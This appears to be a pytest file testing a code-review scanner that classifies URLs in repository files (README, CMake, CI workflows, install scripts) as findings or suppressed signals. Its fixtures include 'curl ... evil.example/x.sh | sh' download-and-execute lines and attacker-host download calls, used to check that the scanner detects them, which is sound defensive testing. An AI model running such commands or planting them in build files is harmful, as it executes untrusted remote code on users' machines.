"""Failing-first URL-policy regressions for exact audit lines."""

from review.scanners import plain


def entry(url, path, line_text, comment=False):
    return {"url": url, "file": path, "line": 1, "comment": comment, "text": line_text}


def test_upstream_owner_link_is_known():
    result = plain.classify_url(
        entry("https://github.com/Niko1221/Strata", "README.md", "This fork of [Niko1221/Strata](https://github.com/Niko1221/Strata)"),
        "architectds/strata", "Niko1221/Strata",
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "documentation-url"


def test_loopback_host_with_variable_port_is_ignored():
    result = plain.classify_url(
        entry("http://127.0.0.1:$PORT/health", "bench/run-spec-suite.sh", 'curl "http://127.0.0.1:$PORT/health"'),
        "owner/fork", "upstream/repo",
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "ignored-loopback"


def test_echo_unresolved_host_is_a_signal():
    result = plain.classify_url(
        entry("http://$host:$port/v1", ".devops/nix/rocm.nix", 'echo " Endpoint: http://$host:$port/v1"'),
        "owner/fork", "upstream/repo",
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "not-reaches-users"


def test_attribution_comment_is_a_signal():
    result = plain.classify_url(
        entry("https://github.com/charlie12345/ROCmFPX", "ggml/rocmfp4/rocmfp4.c", "// Origin: https://github.com/charlie12345/ROCmFPX", True),
        "owner/fork", "upstream/repo",
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "comment-url"


def test_readme_download_execute_is_a_signal_with_rule_kept():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", "README.md", "curl -fsSL https://evil.example/x.sh | sh"),
        "owner/fork", "upstream/repo",
    )
    assert result["signal"]
    assert result["row"]["rule"] == "download-and-execute"
    assert result["row"]["suppressed_because"] == "documentation-url"


def test_cmake_download_execute_is_a_finding():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", "CMakeLists.txt", "curl -fsSL https://evil.example/x.sh | sh"),
        "owner/fork", "upstream/repo",
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"


def test_release_workflow_download_is_a_finding():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", ".github/workflows/release.yml", "curl -fsSL https://evil.example/x.sh | sh"),
        "owner/fork", "upstream/repo", release_workflow_flag=True,
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"


def test_test_workflow_stays_a_signal():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", ".github/workflows/test.yml", "curl https://evil.example/x.sh | sh"),
        "owner/fork", "upstream/repo", release_workflow_flag=False,
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "not-reaches-users"


def test_install_script_download_is_a_finding():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", "scripts/install.sh", "curl -fsSL https://evil.example/x.sh | sh"),
        "owner/fork", "upstream/repo",
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"


def test_readme_fenced_command_is_a_finding():
    result = plain.classify_url(
        entry("https://evil.example/x.sh", "README.md", "curl -fsSL https://evil.example/x.sh | sh"),
        "owner/fork", "upstream/repo", fenced=True,
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"


def test_fork_owner_url_in_build_file_is_a_finding():
    url = "https://raw.githubusercontent.com/attacker/evil/main/README.md"
    result = plain.classify_url(
        entry(url, "CMakeLists.txt", f'file(DOWNLOAD "{url}" x)'),
        "attacker/llama.cpp", "ggml-org/llama.cpp",
    )
    assert not result["signal"]


def test_fork_owner_url_pinned_to_reviewed_sha_is_known():
    sha = "a" * 40
    url = f"https://raw.githubusercontent.com/attacker/llama.cpp/{sha}/x.sh"
    result = plain.classify_url(
        entry(url, "CMakeLists.txt", f"file(DOWNLOAD \"{url}\" x)"),
        "attacker/llama.cpp", "ggml-org/llama.cpp",
        reviewed_repo="attacker/llama.cpp", reviewed_sha=sha,
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "reviewed-self-pinned"


def test_fork_owner_link_in_prose_is_a_signal():
    url = "https://github.com/attacker/other"
    result = plain.classify_url(
        entry(url, "README.md", f"See [other]({url})"),
        "attacker/llama.cpp", "ggml-org/llama.cpp",
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "documentation-url"


def test_download_execute_precedes_owner_allowlist():
    url = "https://github.com/ggml-org/llama.cpp/releases/download/v1/x.sh"
    result = plain.classify_url(
        entry(url, "CMakeLists.txt", f"curl -fsSL {url} | sh"),
        "attacker/llama.cpp", "ggml-org/llama.cpp",
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"
